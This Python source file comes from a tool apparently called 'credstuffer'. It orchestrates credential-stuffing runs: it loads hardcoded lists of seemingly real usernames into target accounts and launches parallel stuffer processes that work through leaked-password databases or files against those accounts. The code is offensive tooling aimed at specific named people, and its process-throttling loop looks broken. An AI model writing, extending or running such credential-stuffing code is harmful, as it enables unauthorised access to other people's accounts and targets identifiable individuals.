import logging
from credstuffer import UserAccount
from credstuffer.database_stuffer import DatabaseStuffer
from credstuffer.file_stuffer import FileStuffer

usernames = [
    "shagattack",
    #"Gandi",
    #"Alki 90",
    #"seitzfabi",
    #"Cologne881",
    #"Dömers123",
    #"Mes35904",
    #"alexvögerl",
    #"seitzdani",
    #"Michl85",
    "bierschi"
]


class Algorithm:
    """ class Stuffing to execute the credential stuffing algorithm

    USAGE:
            stuffing = Stuffing()

    """
    def __init__(self, accounts, filepath=None, **dbparams):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class Algorithm')

        usernames = ["Gandi", "Alki 90", "seitzfabi", "Cologne881", "Dömers123", "Mes35904", "alexvögerl", "seitzdani", "Michl85", "bierschi"]
        self.dbparams = dbparams
        self.filepath = filepath

        self.accounts = accounts
        for account in self.accounts:
            account.set_usernames(usernames=usernames)

        self.schema_list = list('abcdefghijklmnopqrstuvwxyz')

    def execute(self):
        """

        :return:
        """

        for account in self.accounts:
            if isinstance(account, UserAccount):
                if self.filepath is None:
                    processes = list()
                    for c_schema in self.schema_list:
                        stuffer = DatabaseStuffer(account=account, schema_char=c_schema, **self.dbparams)
                        stuffer.start()
                        processes.append(stuffer)
                        if len(processes) == 6:
                            wait = True
                            while wait:
                                for proc in processes:
                                    if not proc.is_alive():
                                        self.logger.info("Start new Process")
                                        wait = False
                else:
                    stuffer = FileStuffer(account=account, filepath=self.filepath)
                    stuffer.start()
            else:
                # handle email accounts
                pass


    def database(self):
        """

        :return:
        """
        pass

    def files(self):
        """

        :return:
        """
        pass

    def map_usernames(self):
        """

        :return:
        """
        pass
